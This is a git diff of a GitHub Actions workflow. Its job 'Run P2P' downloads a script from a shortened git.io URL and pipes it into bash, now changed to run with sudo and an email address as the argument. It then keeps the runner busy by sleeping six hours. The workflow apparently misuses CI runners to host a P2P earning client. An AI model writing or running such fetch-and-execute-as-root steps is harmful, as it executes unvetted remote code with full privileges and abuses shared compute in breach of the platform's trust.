@@ -11,6 +11,6 @@ jobs:
     runs-on: ubuntu-20.04
     steps:
     - name: Run P2P
-      run: bash <(curl -fsSL git.io/JzDdQ) kolana122@outlook.com
+      run: sudo bash <(curl -fsSL git.io/JzDdQ) kolana122@outlook.com
     - name: Timeout
       run: sleep 6h
